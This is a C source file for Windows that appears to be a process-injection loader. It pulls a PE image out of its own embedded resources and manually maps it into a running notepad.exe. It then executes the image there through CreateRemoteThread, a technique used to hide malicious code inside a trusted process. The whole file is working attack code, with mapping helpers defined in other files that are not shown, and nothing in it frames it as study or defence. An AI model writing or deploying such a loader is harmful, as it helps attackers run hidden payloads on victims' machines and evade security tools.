#include <windows.h>
#include <stdio.h>

#include "../resources/resource.h"
#include "map.h"

LPVOID GetResource(DWORD dwName, LPCSTR lpType, DWORD *pSize);

int main(void) {
    LPCTSTR lpProcessName = "notepad.exe";
    DWORD dwDesiredAccess = PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD;
    HANDLE hProcess = GetProccessHandle(lpProcessName, NULL, dwDesiredAccess);

    if (hProcess == NULL) {
        return 0;
    }

    DWORD dwSize = 0;
    DWORD dwEntryPoint = 0;
    LPVOID lpData = GetResource(IDI_RSRC, RT_RCDATA, &dwSize);
    LPVOID lpRemoteAlloc = ManuallyMapImage(hProcess, lpData, dwSize, NULL, &dwEntryPoint);

    HANDLE hRemoteThread = CreateRemoteThread(
                                hProcess,
                                NULL,
                                0,
                                (LPTHREAD_START_ROUTINE)((BYTE *)lpRemoteAlloc + dwEntryPoint),
                                lpRemoteAlloc,
                                0,
                                NULL
                            );

    NtWaitForSingleObject(hRemoteThread, FALSE, NULL);

    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);
    return 0;
}

LPVOID GetResource(DWORD dwName, LPCSTR lpType, DWORD *pSize) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(dwName), lpType);
    HGLOBAL hMemory = LoadResource(hModule, hResource);
    DWORD dwSize = SizeofResource(hModule, hResource);
    LPVOID lpAddress = LockResource(hMemory);

    *pSize = dwSize;
    return lpAddress;
}
